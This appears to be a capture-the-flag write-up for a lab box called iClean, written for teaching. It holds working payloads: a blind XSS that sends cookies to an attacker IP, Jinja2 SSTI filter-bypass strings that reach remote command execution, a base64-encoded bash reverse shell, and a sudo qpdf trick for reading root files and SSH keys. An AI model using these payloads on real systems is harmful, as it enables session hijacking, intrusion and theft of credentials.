# iClean

## Introduction

I wanted to make this easy box in order to help beginners but there are some little tricks which I hope will help and interest intermediate players as well. This box is meant to introduce players to Blind XSS as well as filter bypasses (double underscore is filtered for the SSTI), and PDF modification with qpdf binary.
This box can also be helpful for the more experienced players as it re-enforces known techniques chained in a different way and showcases a PDF parser with a tricky syntax.

## Writeup

Running a standard nmap scan on all ports, we can find 2 exposed ports: 22, 80:

![image](https://user-images.githubusercontent.com/80063008/235944178-ac4c4d5b-6c06-48f5-a749-8d6faf3c0508.png)

Accessing the website hosted on port 80, we can see a cleaning agency's web page and a login option in the upper right corner but we don't have any credentials yet:

![image](https://user-images.githubusercontent.com/80063008/235944858-7353219b-b90b-44ac-8d9d-ee10ebcf33f0.png)

Scrolling further down, we see we have the option to request a quote:

![image](https://user-images.githubusercontent.com/80063008/235945269-040241ac-c778-47ce-ae30-3e67b18174e3.png)

We can choose between some services and enter our email address:

![image](https://user-images.githubusercontent.com/80063008/235945477-e5043389-14c1-4068-b8c0-c7ef86a0bf45.png)

After we hit submit, we see this thank you message.

![image](https://user-images.githubusercontent.com/80063008/235945657-b016e2eb-5fc0-42b6-b0ff-1604a1ba98cd.png)

This indicates to us that someone will be checking the message we just sent. Since we intercepted the request using Burpsuite, let's switch it to the Repeater tab. Here we see the original POST request:

![image](https://user-images.githubusercontent.com/80063008/235946030-bcb2e755-79aa-4a49-97f8-a5d6c51941ee.png)

Let's replace the service with a URL encoded XSS payload to try and grab any cookies that might be unprotected.

```html
<img src=1 onerror=this.src="http://192.168.127.140:1337/?"+document.cookie;>
```
![image](https://user-images.githubusercontent.com/80063008/235946327-0eb09cd0-72b0-424b-bd3e-4416470a47ae.png)

We listen for a couple of minutes on port 1337 and eventually we get a callback:

Someone accessed the message we sent and we have their session cookie:

![image](https://i.imgur.com/yX42hSv.png)

Fuzzing for directories using `raft-small-words.txt` or other wordlists, we can see a few endpoints. The /choose endpoint mentions they have some issues with their invoicing systems.

![image](https://user-images.githubusercontent.com/80063008/235950447-7321d3fa-2758-44f0-bc02-3a34f08c4b2e.png)

The `dashboard` directory stands out because it redirects us back to the home page.

```bash
wfuzz -u http://capiclean.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --hw 31
```
![image](https://user-images.githubusercontent.com/80063008/235949091-fa8d8089-a561-439e-b351-6135cade5c45.png)

After we add the stolen cookie in our web browser and go to /dashboard, we see we are logged into the Admin Dashboard.

![image](https://i.imgur.com/egC3egc.png)

The Generate Invoice option redirects us to a page that allows us to Generate Invoices presumably based on the Quote Requests they get:

![image](https://i.imgur.com/8CeCWZ1.png)

Considering they said they have some issues with the invoicing system, we will focus on this functionality for now. Let's test it out. We first type something different in each box and hit generate. This generates an Invoice ID. No further actions can be taken here. We'll copy this ID in the clipboard just in case.

![image](https://i.imgur.com/ndIYZ89.png)

The Generate QR option asks us for the Invoice ID. Good thing we copied it a moment ago:

![image](https://i.imgur.com/IOvMPgM.png)

After hitting Generate, we get a QR Code link and a new option is activated:

![image](https://i.imgur.com/XBrlrHP.png)

Accessing the generated link, we see a QR Code:  
![image](https://i.imgur.com/oxqyyzh.png)

Scanning this QR code, we can see another link to an invoice:

![image](https://i.imgur.com/OPkWvx9.png)

Accessing this now, we can see an invoice with our parameters from earlier but in the lower right corner, the QR Code is empty:

![image](https://i.imgur.com/qdUGQvy.png)

Going back to the QR Generator, we can see it is instructing us to insert the provided QR link to generate a scannable invoice:

![image](https://i.imgur.com/lMF34nm.png)

After copying and pasting the link, we can see that indeed an invoice was generated with the QR filled in:

![image](https://i.imgur.com/9csqRPc.png)

Looking at the source code from the browser or via the Burpsuite Proxy, we can see that the QR Code is base64 encoded:

![image](https://i.imgur.com/DwRucdw.png)

After some trial and error with the Invoice Generator, we soon find out that all parameters are properly sanitized. So it would seem for the invoice ID field as well. Inputting anyting other then a valid Invoice ID that we generate simply reloads the page. So, the only other field we have to test is the one where we are inserting a QR link.

There are many vulnerabilities we can check for when it comes to potentially unsanitized user input, however, we need to keep in mind this is a python webserver (as indicated by nmap and Burpsuite) most likely running Flask so we can assume it is using some kind of templating engine. Let's test for SSTI with the standard payload {{7*7}}.

At first glance, the QR code isn't being generated and placed into the invoice, however, upon checking the source code, we can see that indeed we have confirmed SSTI vulnerability:

![image](https://i.imgur.com/Yo4zi7S.png)

A good resource is [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti). Let's try to get the classes:

```bash
{{ dict.__base__.__subclasses__() }}
```
This payload fails and we get a 500 Internal Server Error which means something in our payload broke the Invoice Generator.

![image](https://i.imgur.com/ZPUL5jp.png)

Through experimentation with various payloads we find that double underscore is filtered. Presumably a patching attempt to prevent the website from getting hacked. There are multiple ways of bypassing double underscore. An example can be found here:

![image](https://user-images.githubusercontent.com/80063008/220181254-ee3f4603-fde9-4b60-b328-26b91fbb6970.png)

https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f

We can still grab the classes using the payload below:

```bash
{{''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)()}}
```

or

```bash
{{ (dict.mro()[-1]|attr(["_"*2,"subclasses","_"*2]|join))() }}
```

![image](https://i.imgur.com/t52h5cm.png)

We can grab this text and put it in a file. After we copy and paste the entire output in a local file, we can use the syntax below to arrange all subclasses on new lines, start reading from the 2nd line (the first line only says the class type), recode html to utf-8 and grep -n allows to list the line number.

```bash
cat classes|sed 's/, /\n/g'|tail -n +2|recode html..utf-8|grep -n 'Popen'
```

![image](https://i.imgur.com/nZxU29S.png)

We find out that `Popen`, a class we can use for RCE, is number `365`. With that piece of information, we can use the same trick as before to build this payload and bypass the double underscore filter:

```bash
{{(''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)())[365]('id',shell=True,stdout=-1).communicate()}}
```

We confirmed we have Remote Command Execution at this point:

![image](https://i.imgur.com/zoejMPo.png)

We can use a simple bash reverse shell that's base64 encoded to avoid weird characters and get a foothold as user "www-data":

```bash
{{(''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)())[365]('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTI3LjE0MC8xMzM3IDA+JjE=|base64 -d|bash',shell=True,stdout=-1).communicate()}}
```
![image](https://user-images.githubusercontent.com/80063008/235957973-1c204ca3-6b98-486e-ba71-c647c4061c22.png)

Now another enumeration phase begins. We search around and find that there's a user called `consuela`.

![image](https://user-images.githubusercontent.com/80063008/235958522-2d3a48fd-1056-41a3-893e-4e505ee33602.png)

The `app.py` that was running the website was found on /opt/app and we have some MySQL credentials:
![image](https://i.imgur.com/XssPm9f.png)

Trying these creds to switch or login to user Consuela doesn't work. However, we can use them to check the MySQL database. 

```bash
mysql -h localhost -u iclean -D capiclean -p
```
We have a users tables:

![image](https://i.imgur.com/Y3m4BnO.png)

In this table, we see the hash of the password of user consuela:
![image](https://i.imgur.com/5ow4xnv.png)

This can be cracked using hashcat, john or [crackstation.net](https://crackstation.net)  
![image](https://i.imgur.com/6k7jRud.png)

At this point we can login as user Consuela and get the user flag.

![image](https://user-images.githubusercontent.com/80063008/235963551-a6e161c7-88ab-46ef-9939-daf62bf07ce6.png)

We also notice we have email. It seems Consuela was instructed by management to check the invoices because they've been receiving blank PDFs lately.

![image](https://i.imgur.com/dSNAiMW.png)

Checking what sudo permissions Consuela has, we notice she is able to run `/usr/bin/qpdf` as sudo.

![image](https://user-images.githubusercontent.com/80063008/235964254-5b32ce44-8d7a-4054-8a8c-eb24c754ed3c.png)

Doing some research on this tool, we find it is a standard software used for PDF modifications and transformations.

![image](https://user-images.githubusercontent.com/80063008/235964422-986848e1-2256-4e50-89f1-0fbf79d06e96.png)

Although the full documentation can be found here: https://qpdf.readthedocs.io/en/stable/ it can be quite confusing as it is vague in places. After more research we find we can attach files to PDFs. 

https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments

Let's try to read the /root/root.txt file. We may need a PDF file, which we can upload to the box. More trial and error in the terminal to get the syntax correct and we get this command.

```bash
sudo /usr/bin/qpdf /tmp/testfile.pdf --add-attachment /root/root.txt -- test.pdf
```

Or, without a PDF, we can actually start from an empty one using the `--empty` flag:

```bash
sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt -- test.pdf
```

This command created the `test.pdf` file as root in the current folder:

![image](https://user-images.githubusercontent.com/80063008/235965563-e683c6ac-d215-4da6-9561-ef99b41935e4.png)

We can copy the file locally and open it and check for an attachment or we can again use `qpdf` with the syntax below to read the content of the attachment:

```bash
qpdf test.pdf --show-attachment=root.txt
```
![image](https://user-images.githubusercontent.com/80063008/235965874-39f4451f-7964-4e9f-9491-8c3044ec8a22.png)

Players could also try to read an SSH key and get a foothold as root in this manner:

![image](https://i.imgur.com/DCYcNyY.png)

![image](https://user-images.githubusercontent.com/80063008/235966548-a84e3bd1-0b46-4f01-b306-1d7ca519902a.png)
